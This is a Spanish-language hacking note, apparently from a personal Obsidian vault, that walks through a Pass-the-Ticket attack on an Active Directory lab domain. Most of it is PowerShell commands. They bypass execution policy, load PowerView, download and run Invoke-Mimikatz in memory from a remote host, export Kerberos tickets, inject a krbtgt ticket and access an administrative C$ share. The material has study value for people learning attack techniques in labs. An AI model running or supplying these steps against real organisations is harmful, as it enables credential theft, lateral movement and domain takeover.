
Se trata de una técnica de robo de credenciales que permite robar tickets de kerberos para autenticarse en recursos como usuario sin tener que utilizar la password del usuario. Se suele utilzar esta técnica para moverse lateralmente en la red de una organización y escalar privs.

Se pueden llegar a conseguir tickets TGS (ticket-grating service) y TGT (Ticket-grating tickets).

tareas a realizar:

1. Reconocimiento
2. Implementación de ataque
3. Exportar el ticket de kerberos
4. Revisar el acceso del Dominio

Ejemplo práctico:

Desde el ejemplo podemos ejecutar un powershell como administrador.

```powershell
cd C:\\
cd tools
powershell -ep bypass
. .\PowerView.ps1

#Somos usuario student y estamos en el hostname client.

Find-LocalAdminAccess
```

![[Pasted image 20250402085954.png]]

```powershell

Enter-PSSession seclogs.research.SECURITY.local
whoami /priv

#Podemos ver que tenemos privs de usuario elevado.
```

Lanzamos el servidor HFS como hemos visto en [[Hacking/Hacking/Pivoting y lateral movement/Lateral Movement/windows/Pass-the-Hash|Pass-the-Hash]] y añadimos el Invoke-Mimikatz.ps1.

```powershell
cd /
iex (New-Object Net-WebClient).DownloadString('http://ip/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
ls | select name
```

![[Pasted image 20250402090547.png]]

Estos son los tickets que ha exportado de Kerberos. Importante los krbtgt,

```powershell
Invoke-Mimikatz -Command '"kerberos::ptt [0;2939a]-2-0.40e10000-maintainer@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi"'
```

![[Pasted image 20250402091458.png]]

Con esta resolución podemos confirmar que el ticket a sido integrado en la sesión.

```powershell
klist
#COn este comando podemos ver los tickets almacenados.

#Abrimos una nueva sesión de powershell como admin.
cd C:\\
cd tools
powershell -ep bypass
. .\PowerView.ps1

#DEsde la anterior terminal de powerhsell
ls \\prod.research.security.local\c$

